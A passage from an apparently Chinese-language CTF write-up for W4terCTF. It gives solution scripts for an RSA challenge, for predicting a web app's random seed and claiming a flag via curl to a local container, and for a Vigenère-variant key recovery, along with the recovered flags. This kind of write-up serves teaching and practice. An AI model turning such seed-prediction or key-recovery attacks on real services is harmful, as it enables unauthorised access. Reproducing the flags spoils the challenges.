class=\"number\">15237245518187783270118095809520813715956779970121151605236017245281663349927871664089323996437198235332380649056157552139824794588282124241562678460596507994160450297450179528976589398846210519549196888613143426635079434084452257874065484561750625879566967728892028875015732523907566365015585071705383965108584900462347980930243703796275135520452238877712806925535901382203444872746731017403372197551202867519872504341875747056250334169640471053205861370866906946583776837242814046091601932206546117069281206618021968118790407685235602371416190212336628756323090425345962230904747291854448754116455587682431569485503641521272971686704473193019132477953908910849831685148677975221237038065750758015111863632278200747000157187997814194029400697403741838489362003974564359614821068833924840443285823258682774010695163217945524608036622625872746384332883461936945674717452827633809865102717159507550663596896932548991216607522697367537118903992798078936423232478772212951734438159292917127451068031982531631571612297893227345579357245226069692084913823443945826318169121459999393340568902299486793470467510065851569244119435052446898779718050907739373838489841346799589855583093882137549631777101404814967710333142369685932771643559927586884873934944456529776507128155937030841026343151440450761869269196359152094226878375985237603824966654988556567217028134068892779253422300240576637315948429841799367844063885304545920357705733411373493758050263143074535948457</span></span><br><span class=\"line\">x = <span class=\"number\">34834945635419823491817566563399234823053176449889821571800075702352062905044231520196782430564993617886316750841220280683153456634693274516582390418863033711415731372881163288179660369032440262647344962570809308551786423557604581792293023628226671539671001863522824415876161727357840363896909435994314597682318687286109212360132261705780761350223208855493439905713509683216585447535669179103840355151676900348955850726834778558748576176596609474037298456423607570516459873639794526160082489103786303332253388597560031538949333472681857144605196440020688999368156212067614295618998719682195870452330682061061500341728481458877113934526003865064359452801</span></span><br><span class=\"line\">y = <span class=\"number\">109071911012732502022850422978096246932142152916423367258339958080776017127779842287569032054094868715662547617710798972237860865468979518796870762466053422806566269221859683504667443154145089120448705028998733329483536176859312788275313407342047772524898407149610870586148015013605624329594138230714119704939505401061380777712216157719510271261619101362035144616187262082302740411574934586360516695062056563100258177611076242927354475633328163841594305884855770651187471060662561145818768319723133613889115397679168254599526858767478331211008997427364431641348477558436549415894985022330773540762573918592860707967250624976183104841257499345937186160</span></span><br><span class=\"line\">n = <span class=\"number\">162908386409122831644601726291514736982460317787650963552042804694858960756247295016072165050452122566555943647913977051861072784403314058088382494116300030479243222291806345961434419243328825539529128842207242691984718290143482242891139352813626310709638170008858946304550631669011725528861157958853032167147</span></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">delta2 = h5**<span class=\"number\">2</span>-<span class=\"number\">4</span>*n*x**<span class=\"number\">2</span>*y**<span class=\"number\">2</span></span><br><span class=\"line\">delta = gmpy2.iroot(delta2,<span class=\"number\">2</span>)</span><br><span class=\"line\">delta = <span class=\"built_in\">int</span>(delta[<span class=\"number\">0</span>])</span><br><span class=\"line\"><span class=\"built_in\">print</span>(delta)</span><br><span class=\"line\"><span class=\"keyword\">if</span> (h5+delta)%(<span class=\"number\">2</span>*y**<span class=\"number\">2</span>) == <span class=\"number\">0</span>:</span><br><span class=\"line\">    </span><br><span class=\"line\">    q1=(h5+delta)//(<span class=\"number\">2</span>*y**<span class=\"number\">2</span>)</span><br><span class=\"line\">    <span class=\"built_in\">print</span>(<span class=\"string\">f&quot;q1 = <span class=\"subst\">&#123;q1&#125;</span>&quot;</span>)</span><br><span class=\"line\">    </span><br><span class=\"line\"><span class=\"keyword\">if</span> (h5-delta)%(<span class=\"number\">2</span>*y**<span class=\"number\">2</span>) == <span class=\"number\">0</span>:</span><br><span class=\"line\">    </span><br><span class=\"line\">    q2=(h5-delta)//(<span class=\"number\">2</span>*y**<span class=\"number\">2</span>)</span><br><span class=\"line\">    <span class=\"built_in\">print</span>(<span class=\"string\">f&quot;q2=<span class=\"subst\">&#123;q2&#125;</span>&quot;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span> n%q2 == <span class=\"number\">0</span>:</span><br><span class=\"line\">    p=n//q2</span><br><span class=\"line\">    <span class=\"built_in\">print</span>(<span class=\"string\">f&quot;p = <span class=\"subst\">&#123;p&#125;</span>&quot;</span>)</span><br><span class=\"line\">    </span><br><span class=\"line\">q=q2</span><br><span class=\"line\"><span class=\"comment\"># 求e</span></span><br><span class=\"line\">h1 = <span class=\"number\">150247</span></span><br><span class=\"line\">h2 = <span class=\"number\">102488</span></span><br><span class=\"line\">h4 = <span class=\"number\">44535490898726654427376304836986323627856798106830892558987452614726931403119</span></span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"string\">f&quot;q=<span class=\"subst\">&#123;q&#125;</span>&quot;</span>)</span><br><span class=\"line\">tmp = reduce(<span class=\"keyword\">lambda</span> x, y: x * y, <span class=\"built_in\">range</span>(<span class=\"number\">1</span>, h1 - <span class=\"number\">1</span>))</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">while</span> <span class=\"literal\">True</span>:</span><br><span class=\"line\">    e = getPrime(<span class=\"number\">36</span>)</span><br><span class=\"line\">    <span class=\"keyword\">if</span> GCD(e, (p - <span class=\"number\">1</span>) * (q - <span class=\"number\">1</span>)) == <span class=\"number\">1</span> <span class=\"keyword\">and</span> e &lt; (p-<span class=\"number\">1</span>)*(q-<span class=\"number\">1</span>) <span class=\"keyword\">and</span> ( tmp * e) % h1 == h2:</span><br><span class=\"line\">        <span class=\"built_in\">print</span>(<span class=\"string\">f&quot;maybe e=<span class=\"subst\">&#123;e&#125;</span>&quot;</span>)</span><br><span class=\"line\">        d=gmpy2.invert(e, (p - <span class=\"number\">1</span>) * (q - <span class=\"number\">1</span>))</span><br><span class=\"line\">        <span class=\"built_in\">print</span>(<span class=\"string\">f&quot;maybe d=<span class=\"subst\">&#123;d&#125;</span>&quot;</span>)</span><br><span class=\"line\">        nh4 = d % (<span class=\"number\">2</span> ** (d.bit_length() // <span class=\"number\">4</span>))</span><br><span class=\"line\">        <span class=\"keyword\">if</span> nh4 == h4:</span><br><span class=\"line\">            <span class=\"keyword\">break</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"string\">&quot;success&quot;</span>)</span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"string\">f&quot;e=<span class=\"subst\">&#123;e&#125;</span>&quot;</span>)</span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"string\">f&quot;d=<span class=\"subst\">&#123;d&#125;</span>&quot;</span>)</span><br></pre></td></tr></table></figure></p>\n<p>开 8 个线程运行一晚上，成功枚举到正确的 e, 并得到 d</p>\n<p>使用下面的脚本，根据私钥解密密文，得到 flag</p>\n<p><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> Crypto.Util.number <span class=\"keyword\">import</span> long_to_bytes</span><br><span class=\"line\">e = <span class=\"number\">36905723839</span></span><br><span class=\"line\">d = <span class=\"number\">66781150190539205038154636873316650284846375610597564467113301562207220876080997654261761651771185773920764536611596660709696442562219146865775186656742157829910073552979854383590613522355255045862718785890708775548436159002198598103886840865569957379996409759081212055357149668774721007823047658341778542959</span></span><br><span class=\"line\">n = <span class=\"number\">162908386409122831644601726291514736982460317787650963552042804694858960756247295016072165050452122566555943647913977051861072784403314058088382494116300030479243222291806345961434419243328825539529128842207242691984718290143482242891139352813626310709638170008858946304550631669011725528861157958853032167147</span></span><br><span class=\"line\">c = <span class=\"number\">33087238461387318335074410411142790336660168200231648518849044049333308060938917518277424800358623613184976785426565004507278568420843160272353164463818453523209164535111619601021121321114970839731250362111118957833038271450092546392532900928613625992384890463665974527179679504545602403023570778993190377708</span></span><br><span class=\"line\"></span><br><span class=\"line\">m=<span class=\"built_in\">pow</span>(c,d,n)</span><br><span class=\"line\"><span class=\"built_in\">print</span>(long_to_bytes(m))</span><br></pre></td></tr></table></figure></p>\n<p><code>W4terCTF&#123;W47cH_oUT_7He_Smok3_hIn75_1ROM_wll5oN&#125;</code></p>\n<h2 id=\"wish\"><a class=\"anchor\" href=\"#wish\">#</a> Wish</h2>\n<p>查看源代码，看到确定抽取结果的逻辑：</p>\n<p><figure class=\"highlight python\"><figcaption><span>app.py</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">generate_wish</span>(<span class=\"params\">time, index</span>):</span><br><span class=\"line\">    random.seed(time)</span><br><span class=\"line\">    probability = <span class=\"number\">0</span></span><br><span class=\"line\">    <span class=\"keyword\">for</span> _ <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(index):</span><br><span class=\"line\">        diff = <span class=\"built_in\">min</span>(<span class=\"built_in\">abs</span>(random.randint(<span class=\"number\">0</span>, <span class=\"number\">1919810</span>) - <span class=\"number\">114514</span>), <span class=\"number\">10000</span>)</span><br><span class=\"line\">        probability = <span class=\"number\">100</span> * (<span class=\"number\">0.1</span>) ** diff</span><br><span class=\"line\">    app.logger.info(</span><br><span class=\"line\">        <span class=\"string\">f&#x27;probability: <span class=\"subst\">&#123;probability&#125;</span>, time: <span class=\"subst\">&#123;time&#125;</span>, index: <span class=\"subst\">&#123;index&#125;</span>&#x27;</span>)</span><br><span class=\"line\">    <span class=\"keyword\">if</span> <span class=\"built_in\">int</span>.from_bytes(os.urandom(<span class=\"number\">1</span>), <span class=\"string\">&#x27;little&#x27;</span>) % <span class=\"number\">100</span> + <span class=\"number\">1</span> &lt;= probability:</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"string\">&quot;flag&quot;</span></span><br><span class=\"line\">    <span class=\"keyword\">else</span>:</span><br><span class=\"line\">        characters = string.ascii_letters + string.digits</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"string\">&#x27;&#x27;</span>.join(random.choice(characters) <span class=\"keyword\">for</span> _ <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">4</span>))</span><br></pre></td></tr></table></figure></p>\n<p>发现是利用  <code>time</code>  作为伪随机数序列的初始化种子，要想抽出 flag ，需要  <code>probability</code>  尽可能地大，那么  <code>index</code>  只能取  <code>1</code>  ， <code>abs(random.randint(0, 1919810) - 114514)</code>  的值只能为  <code>0</code>  或  <code>1</code>  ，所以据此爆破出一个可行的  <code>time</code>  ：</p>\n<p><figure class=\"highlight python\"><figcaption><span>pwn_time.py</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">r = <span class=\"number\">24</span>*<span class=\"number\">60</span>*<span class=\"number\">60</span></span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(r):</span><br><span class=\"line\">    random.seed(i)</span><br><span class=\"line\">    <span class=\"keyword\">if</span> <span class=\"built_in\">abs</span>(random.randint(<span class=\"number\">0</span>, <span class=\"number\">1919810</span>) - <span class=\"number\">114514</span>) &lt;= <span class=\"number\">1</span>:</span><br><span class=\"line\">        <span class=\"built_in\">print</span>(i)</span><br></pre></td></tr></table></figure></p>\n<p>得到唯一符合目标的结果： <code>time=20544</code>  ，然后就是真的抽 flag ：</p>\n<p><figure class=\"highlight shell\"><figcaption><span>shell</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">curl -X GET -H &quot;Content-Type:application/octet-stream&quot; http://127.0.0.1:52829/query_reset</span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">获取 3 次 wish 机会</span></span><br><span class=\"line\"></span><br><span class=\"line\">curl -X POST -H &quot;Content-Type: application/json&quot; -d &#x27;&#123;&quot;time&quot;:20544,&quot;index&quot;:1&#125;&#x27; http://127.0.0.1:52829/wish</span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">抽 flag</span></span><br></pre></td></tr></table></figure></p>\n<p><code>W4terCTF&#123;Crack_insteal_of_wish_the_seed_d0ab21251107&#125;</code></p>\n<blockquote>\n<p>即使这样还抽了十几次才出 flag , 好黑的池子！</p>\n</blockquote>\n<h1 id=\"misc\"><a class=\"anchor\" href=\"#misc\">#</a> Misc</h1>\n<h2 id=\"sign-in\"><a class=\"anchor\" href=\"#sign-in\">#</a> Sign In</h2>\n<p>排行榜</p>\n<h2 id=\"brokenmp4\"><a class=\"anchor\" href=\"#brokenmp4\">#</a> broken.mp4</h2>\n<p>按照 record_1.mp4 的指引，找到了文章链接</p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L05EQVNIL2FydGljbGUvZGV0YWlscy8xMzYxNTE0MTg=\">https://blog.csdn.net/NDASH/article/details/136151418</span></p>\n<p>按照文章指引，去   <span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL2FudGh3bG9jay91bnRydW5jL3JlbGVhc2VzL3RhZy9sYXRlc3Q=\">https://github.com/anthwlock/untrunc/releases/tag/latest</span>   下载所需的软件，选择 <code>untrunc_x64</code></p>\n<p>运行 <code>untrunc-gui</code> , reference file 选  <code>record_1.mp4</code>  , truncated file 选  <code>record_2.mp4</code></p>\n<p><img data-src=\"https://s2.loli.net/2024/04/29/Pn5XoKV7AfyCdEg.png\" alt=\"brokenmp4\" /></p>\n<p>这样就能得到  <code>record_2.mp4</code>  的修复版，在视频结尾能找到 flag</p>\n<p><code>W4terCTF&#123;L1fe_is_5h0rT_so_i_Us3_MKV_248DF3C&#125;</code></p>\n<h2 id=\"shuffle-puts\"><a class=\"anchor\" href=\"#shuffle-puts\">#</a> Shuffle Puts</h2>\n<p>启动容器，从浏览器访问，可以下载一个文件 meow</p>\n<p>执行下面的命令查看文件中所有字符串</p>\n<p><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">strings .\\meow</span><br></pre></td></tr></table></figure></p>\n<p>在输出中可以找到 flag</p>\n<p><code>W4terCTF&#123;sHUFF1e_5hufF1e_FLA6_MEOWmeOWm30W&#125;</code></p>\n<h2 id=\"revenge-of-vigenere\"><a class=\"anchor\" href=\"#revenge-of-vigenere\">#</a> Revenge of Vigenere</h2>\n<p>这题的加密是维吉尼亚密码的一个变种</p>\n<p>连接容器后，只能获得加密后的密文</p>\n<p>解决思路是如果知道原文的一个片段，而且知道完整的密文，可以尝试倒推 KEY。</p>\n<p>原文中存在 W4terCTF 是确定的，可以据此倒退 KEY</p>\n<p>运行下面的代码，根据已知的明文 <code>W4terCTF</code>  和密文 <code>Q4doySZB</code>  , 尝试推出密钥的其中连续 7 位</p>\n<p><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> remote</span><br><span class=\"line\"><span class=\"keyword\">while</span> <span class=\"literal\">True</span>:</span><br><span class=\"line\">    recv = <span class=\"string\">&#x27;Vqcvh! Pd beoq, m bhkhbu bxohuowrlkux fljknkh, oufr bysgocsklze au vydo loydcy uab bybrxcr rr hne xcmsziopexqm bd Lqjk. Qbmi Owyaiy, xy tuxa Fyzyrp uv Lgkcxo, bg ot Xycdpwk kp nty Imd fevrfm, dhk Baeuxd, Cqtecbqx, nq zxu ukwi Lbhgl Xisml el pry Hyegyycoicxkws toy Poxlhgpom ibnr zxue lhgu Owrihcon. Oecafyd, nugy Lqrllskl Josknkdpet kp u ns-tmtu Lkuuxyhb, ytchnc Cybepcqx, nlj xqy Siauw hu Vchaepin pryey Ictqb gkx Zykirepn Foycoj fuzahyxt-ytd Pmsx otd Xiemoigbshs nuc Byerbhxbr Jockiec hdj Rylmwvmai Lolfejbct oh Pyvpjokx. Uycqqz jxop Pshmsd oh Pobieyeds, m Prgrut Bbmxyzs uf Xcxnpsgpsiz yzcxwuy: x Pehbohlg Q4doySZB&#123;lYzyNRN_Jx3_sXMo_lBU3T3RG_5NBvR3I_84Ig_GcFB_i3L934ts3&#125;, okq Pmltqoowm Fojjun pid Pvazehe. Qbi egze Vglnsjj oo Fyzarytsu; g Syrtxhza, jyvn hi g Rynupr, luj yt Sumd, ycx tjy Fkskk wxx Hyeyiyje lz wkvv yhcfv yuu jwi Puhqgiqjk qbi Lbuolchd kut zdo Pulgsuki. Bblmbr, hniu Psmooyoycey bd Buhhfuku Oskru gyca Lknliey, lcz myzecr ymg Bonowoz boac nty Ighhqtq Psyvs uf Xuvskqzeyh. Uh gfoi Lkfh, mj bg sy Xybi neuz rizie ru cukq ssk tbj yqo wkf sghv gq P.&#x27;</span></span><br><span class=\"line\">    <span class=\"comment\">#</span></span><br><span class=\"line\">    <span class=\"comment\"># print(recv)</span></span><br><span class=\"line\">    <span class=\"comment\"># print(len(recv))</span></span><br><span class=\"line\">    index = <span class=\"number\">0</span></span><br><span class=\"line\">    idx_arr=[]</span><br><span class=\"line\">    <span class=\"keyword\">for</span> ch <span class=\"keyword\">in</span> recv:</span><br><span class=\"line\">        <span class=\"keyword\">if</span> ch.isalpha():</span><br><span class=\"line\">            idx_arr.append(index)</span><br><span class=\"line\">            index += <span class=\"number\">1</span></span><br><span class=\"line\">        <span class=\"keyword\">else</span>:</span><br><span class=\"line\">            idx_arr.append(<span class=\"number\">0</span>)</span><br><span class=\"line\">    <span class=\"comment\"># print(idx_arr)</span></span><br><span class=\"line\">    start = <span class=\"number\">609</span></span><br><span class=\"line\">    <span class=\"comment\"># start = 0</span></span><br><span class=\"line\">    <span class=\"built_in\">min</span> = <span class=\"string\">&#x27;W4terCTF&#x27;</span></span><br><span class=\"line\">    <span class=\"keyword\">def</span> <span class=\"title function_\">test</span>(<span class=\"params\">start, <span class=\"built_in\">min</span></span>):</span><br><span class=\"line\">        <span class=\"keyword\">for</span> i,x <span class=\"keyword\">in</span> <span class=\"built_in\">enumerate</span>(<span class=\"built_in\">min</span>):</span><br><span class=\"line\">            <span class=\"keyword\">if</span> <span class=\"keyword\">not</span> x.isalpha():</span><br><span class=\"line\">                <span class=\"keyword\">continue</span></span><br><span class=\"line\">            mi_i = start + i</span><br><span class=\"line\">            mi = recv[mi_i]</span><br><span class=\"line\">            mi_idx=idx_arr[mi_i]</span><br><span class=\"line\">            <span class=\"keyword\">if</span> x.isupper():</span><br><span class=\"line\">                base = <span class=\"built_in\">ord</span>(<span class=\"string\">&#x27;A&#x27;</span>)</span><br><span class=\"line\">            <span class=\"keyword\">else</span>:</span><br><span class=\"line\">                base = <span class=\"built_in\">ord</span>(<span class=\"string\">&#x27;a&#x27;</span>)</span><br><span class=\"line\">            val = <span class=\"string\">&#x27;ABCDEFGHIJKLMNOPQRSTUVWXYZ&#x27;</span></span><br><span class=\"line\">            <span class=\"keyword\">for</span> v <span class=\"keyword\">in</span> val:</span><br><span class=\"line\">                <span class=\"keyword\">if</span> (mi_idx+<span class=\"number\">1</span>)%<span class=\"number\">2</span> == <span class=\"number\">1</span> <span class=\"keyword\">and</span> (<span class=\"built_in\">ord</span>(x)-base+mi_idx*(<span class=\"built_in\">ord</span>(v)-<span class=\"number\">65</span>))%<span class=\"number\">26</span> == <span class=\"built_in\">ord</span>(mi)-base <span class=\"keyword\">or</span> (mi_idx+<span class=\"number\">1</span>) % <span class=\"number\">2</span> != <span class=\"number\">1</span> <span class=\"keyword\">and</span> (<span class=\"built_in\">ord</span>(x)-base-mi_idx*(<span class=\"built_in\">ord</span>(v)-<span class=\"number\">65</span>)) % <span class=\"number\">26</span> == <span class=\"built_in\">ord</span>(mi)-base:</span><br><span class=\"line\">                    <span class=\"built_in\">print</span>(v, end=<span class=\"string\">&#x27; &#x27;</span>)</span><br><span class=\"line\">            <span class=\"built_in\">print</span>(<span class=\"string\">f&#x27;\\n<span class=\"subst\">&#123;x&#125;</span>,<span class=\"subst\">&#123;mi&#125;</span>,<span class=\"subst\">&#123;mi_idx&#125;</span>&#x27;</span>)</span><br><span class=\"line\">            <span class=\"built_in\">print</span>(<span class=\"string\">&#x27;&#x27;</span>)</span><br><span class=\"line\">    test(start,<span class=\"built_in\">min</span>)</span><br><span class=\"line\">    <span class=\"built_in\">print</span>(<span class=\"string\">&#x27;-------------&#x27;</span>)</span><br><span class=\"line\">    start=<span class=\"number\">0</span></span><br><span class=\"line\">    <span class=\"built_in\">min</span>=<span class=\"string\">&#x27;Hello&#x27;</span></span><br><span class=\"line\">    <span class=\"comment\"># test(start,min)</span></span><br><span class=\"line\">    <span class=\"keyword\">break</span></span><br></pre></td></tr></table></figure></p>\n<p>运行结果如下，为密钥其中连续七位可能的取值，每一位可能会出现多种取值，所以有些行有两个字母</p>\n<p><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">K X </span><br><span class=\"line\">W,Q,496</span><br><span class=\"line\"></span><br><span class=\"line\">O </span><br><span class=\"line\">t,d,497</span><br><span class=\"line\"></span><br><span class=\"line\">J W</span><br><span class=\"line\">e,o,498</span><br><span class=\"line\"></span><br><span class=\"line\">J</span><br><span class=\"line\">r,y,499</span><br><span class=\"line\"></span><br><span class=\"line\">H U</span><br><span class=\"line\">C,S,500</span><br><span class=\"line\"></span><br><span class=\"line\">O</span><br><span class=\"line\">T,Z,501</span><br><span class=\"line\"></span><br><span class=\"line\">G T</span><br><span class=\"line\">F,B,502</span><br></pre></td></tr></table></figure></p>\n<p>然后，利用下面的代码，用部分密钥尝试还原出原文</p>\n<p>因为只知道密钥的一部分，所以只能还原原文的一些片段。具体的操作为，考虑到密钥的长度在 10 和 20 之间，枚举密钥的长度，对于每个枚举，根据 <code>Q4doySZB</code>  在密文中的位置推算已知密钥片段在密钥中的位置</p>\n<p>另外，考虑到密钥已知部分的每一位都可能有多种取值，还需要用回溯法枚举所有可能的密钥片段，可能性只有 16 种，数量不是很大</p>\n<p><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> random</span><br><span class=\"line\">recv = <span class=\"string\">&#x27;Vqcvh! Pd beoq, m bhkhbu bxohuowrlkux fljknkh, oufr bysgocsklze au vydo loydcy uab bybrxcr rr hne xcmsziopexqm bd Lqjk. Qbmi Owyaiy, xy tuxa Fyzyrp uv Lgkcxo, bg ot Xycdpwk kp nty Imd fevrfm, dhk Baeuxd, Cqtecbqx, nq zxu ukwi Lbhgl Xisml el pry Hyegyycoicxkws toy Poxlhgpom ibnr zxue lhgu Owrihcon. Oecafyd, nugy Lqrllskl Josknkdpet kp u ns-tmtu Lkuuxyhb, ytchnc Cybepcqx, nlj xqy Siauw hu Vchaepin pryey Ictqb gkx Zykirepn Foycoj fuzahyxt-ytd Pmsx otd Xiemoigbshs nuc Byerbhxbr Jockiec hdj Rylmwvmai Lolfejbct oh Pyvpjokx. Uycqqz jxop Pshmsd oh Pobieyeds, m Prgrut Bbmxyzs uf Xcxnpsgpsiz yzcxwuy: x Pehbohlg Q4doySZB&#123;lYzyNRN_Jx3_sXMo_lBU3T3RG_5NBvR3I_84Ig_GcFB_i3L934ts3&#125;, okq Pmltqoowm Fojjun pid Pvazehe. Qbi egze Vglnsjj oo Fyzarytsu; g Syrtxhza, jyvn hi g Rynupr, luj yt Sumd, ycx tjy Fkskk wxx Hyeyiyje lz wkvv yhcfv yuu jwi Puhqgiqjk qbi Lbuolchd kut zdo Pulgsuki. Bblmbr, hniu Psmooyoycey bd Buhhfuku Oskru gyca Lknliey, lcz myzecr ymg Bonowoz boac nty Ighhqtq Psyvs uf Xuvskqzeyh. Uh gfoi Lkfh, mj bg sy Xybi neuz rizie ru cukq ssk tbj yqo wkf sghv gq P.&#x27;</span></span><br><span class=\"line\"><span class=\"comment\"># recv = &#x27;Q4doySZB&#x27;</span></span><br><span class=\"line\"><span class=\"comment\"># from secret import original_text</span></span><br><span class=\"line\"><span class=\"comment\"># print(original_text)</span></span><br><span class=\"line\"></span><br><span class=\"line\">start = <span class=\"number\">496</span></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">decrypt_vigenere_variant</span>(<span class=\"params\">plaintext, key</span>):</span><br><span class=\"line\">    key_index = <span class=\"number\">0</span></span><br><span class=\"line\">    key_length = <span class=\"built_in\">len</span>(key)</span><br><span class=\"line\">    text_index = key_index</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">for</span> char <span class=\"keyword\">in</span> plaintext:</span><br><span class=\"line\">        <span class=\"keyword\">if</span> char.isalpha():</span><br><span class=\"line\">            <span class=\"keyword\">if</span> key[key_index % key_length] == <span class=\"string\">&#x27;?&#x27;</span>:</span><br><span class=\"line\">                <span 